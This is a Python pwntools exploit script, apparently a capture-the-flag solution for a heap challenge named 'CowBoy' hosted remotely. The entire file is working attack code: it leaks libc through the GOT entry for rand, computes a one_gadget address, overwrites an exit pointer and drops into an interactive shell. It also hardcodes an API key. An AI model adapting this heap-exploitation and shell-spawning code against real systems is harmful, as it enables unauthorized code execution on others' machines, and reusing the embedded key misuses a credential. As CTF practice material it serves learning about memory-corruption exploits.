import json
from pwn import *
#context.log_level = "debug"

#HOST = "localhost"
HOST = "cowboy.eatpwnnosleep.com"
#PORT = 4444
PORT = 14697

s = remote(HOST, PORT)
a = {
    "apikey" : "5b88ada575f654923442e90a4d3e6bef7ba03ce02a3bc0dec0a0fbbe17d8445f"
	}
if(HOST != "localhost"):
	s.send(json.dumps(a).encode())

elf = ELF("./CowBoy")
libc = ELF("./CowBoy_libc")
pause()

rand_got = elf.got["rand"]
exit_got_pointer = 0x400708

rand_off = libc.symbols["rand"]
one_off = 0x4526a

def func_alloc(size):
	s.sendline("1")
	s.sendline(str(size))

def func_free(bin_num, chunk_num):
	s.sendline("2")
	s.sendline(str(bin_num))

def func_show():
	s.sendline("3")

def func_fill(bin_num, chunk_num, data):
	s.sendline("4")
	s.sendline(str(bin_num))
	s.sendline(str(chunk_num))
	s.send(str(data))

def func_exit():
	s.sendline("5")

func_alloc("20")
func_alloc("2")
func_fill("0", "0", "11111111" + p64(rand_got))
func_alloc("2")

func_show()
s.recvuntil("bin[0]: ")
s.recvuntil(" 0x")
s.recvuntil(" 0x")
real_rand = int(s.recv(12), 16)

real_base = real_rand - rand_off
real_one = real_base + one_off

print "[*] real_base : " + hex(real_base)
print "[*] real_rand : " + hex(real_rand)
print "[*] real_one : " + hex(real_one)

func_fill("0", "0", "11111111" + p64(exit_got_pointer))
func_alloc("20")
func_fill("1", "2", p64(real_one))
func_exit()

s.interactive()